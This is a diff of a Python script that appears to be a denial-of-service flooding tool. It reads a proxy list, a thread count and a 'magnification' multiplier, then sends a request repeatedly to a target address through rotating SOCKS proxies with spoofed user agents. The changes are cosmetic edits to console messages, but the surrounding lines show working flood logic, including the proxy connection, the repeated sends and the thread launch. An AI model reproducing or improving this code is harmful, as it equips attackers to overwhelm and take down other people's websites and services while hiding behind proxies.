@@ -19,7 +19,7 @@ thread_num = int(input("[+] Threads : "))
 out_file = str(input("[+] Proxy [proxy.txt] : "))
 print ("[+] Number Of Proxies : %s" %(len(open(out_file).readlines())))
 time.sleep(0.2)
-multiple = int(input("[+] Input the Magnification : "))
+multiple = int(input("[+] Input The Magnification : "))
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -172,7 +172,7 @@ def run():
             s = socks.socksocket()
             s.connect((str(ip), int(port)))
             s.send(str.encode(request))
-            print (str(proxy[0]+":"+proxy[1])+"<>---------<> Request Send!")
+            print (str(proxy[0]+":"+proxy[1])+" [+] Request Send !")
             try:
                 for y in range(multiple):
                     s.send(str.encode(request))
@@ -184,14 +184,14 @@ def run():
                 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                 s.connect((str(ip), int(port)))
                 s.send(str.encode(request))
-                print (str(proxy[0]+":"+proxy[1])+"<>---------<> Request Send !\r\n")
+                print (str(proxy[0]+":"+proxy[1])+" [+] Request Send !\r\n")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
                 except:
                     s.close()
             except:
-                print ("< ERROR >----< Socks Down >")
+                print (" [!] ERROR Socks Down !")
                 s.close()
 
 for i in range(thread_num):
